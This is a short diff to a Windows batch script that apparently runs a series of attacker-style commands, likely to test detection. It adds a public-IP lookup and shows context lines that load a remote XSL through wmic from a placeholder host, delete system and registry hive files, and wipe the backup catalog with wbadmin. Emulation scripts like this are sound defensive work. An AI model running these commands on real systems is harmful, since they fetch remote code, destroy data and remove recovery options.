@@ -314,6 +314,8 @@ cmd.exe /c powershell.exe Invoke-WebRequest http://www.pdf995.com/samples/pdf.pd
 ECHO ============================
 wmic.exe os get /format:"http://blah/foo.xsl"
 ECHO ============================
+cmd.exe /c powershell.exe (Invoke-WebRequest -uri "https://api.ipify.org/").Content
+ECHO ============================
 del *sys* & del *hive*
 ECHO ============================
 wbadmin delete catalog -quiet
